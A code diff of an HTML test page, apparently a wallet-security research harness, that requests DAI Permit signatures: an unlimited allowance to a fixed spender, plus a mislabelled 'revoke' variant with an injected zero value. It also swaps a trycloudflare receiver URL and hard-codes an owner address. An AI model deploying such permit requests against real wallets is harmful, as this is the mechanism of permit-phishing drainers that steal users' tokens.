@@ -14,18 +14,17 @@ pre{white-space:pre-wrap;word-break:break-all;max-height:430px;overflow:auto;fon
 <main>
   <h2>DAI Permit confirmation test</h2>
   <p>Run: <b>mm-dai-final-20261008</b></p>
-  <button onclick="connect()">Connect disposable wallet</button>
-  <button class="secondary" onclick="requestPermit(false)">Control: normal unlimited DAI Permit</button>
+    <button class="secondary" onclick="requestPermit(false)">Control: normal unlimited DAI Permit</button>
   <button onclick="requestPermit(true)">Request “revoke” (injected value=0)</button>
   <div id="result" class="result">Ready</div>
   <pre id="log"></pre>
 </main>
 <script>
-const RECEIVER='https://humidity-his-examine-tired.trycloudflare.com';
+const RECEIVER='https://empire-operate-educational-resolve.trycloudflare.com';
 const MAX='115792089237316195423570985008687907853269984665640564039457584007913129639935';
 const SPENDER='0x8b94b6e459e88dc8c153afa3a825fd258691ccb6';
 const DAI='0x6b175474e89094c44da98b954eedeac495271d0f';
-let owner='';
+let owner='0x0dc8de221BD4C0142e68250520E038cfb14b37e8';
 const log=document.querySelector('#log'), result=document.querySelector('#result');
 function show(text,good){result.className='result '+(good===true?'ok':good===false?'bad':'');result.textContent=text}
 function out(kind,value){
@@ -49,8 +48,7 @@ function payload(currentNonce){
 }
 async function requestPermit(injected){
   try{
-    if(!owner)await connect();
-    const p=payload(await nonce());
+    const p=payload('0');
     if(injected)p.message.value='0';
     const variant=injected?'injected_value_zero':'baseline';
     out('REQUEST',{variant,payload:p});
@@ -70,5 +68,5 @@ async function requestPermit(injected){
     show('Installed-app signature accepted by canonical mainnet DAI: '+verification.ethCallAccepted+'. Read-only call left nonce unchanged: '+verification.stateUnchanged+'.'+security,verification.ethCallAccepted&&verification.stateUnchanged);
   }catch(e){out('ERROR',{at:injected?'injected':'baseline',message:e.message,code:e.code,data:e.data});show(e.message,false)}
 }
-setTimeout(async()=>{try{out('PROVIDER',{ethereum:!!window.ethereum,chainId:window.ethereum?await ethereum.request({method:'eth_chainId'}):null})}catch(e){}},250);
+setTimeout(()=>out('READY',{ethereum:!!window.ethereum,owner}),250);
 </script>
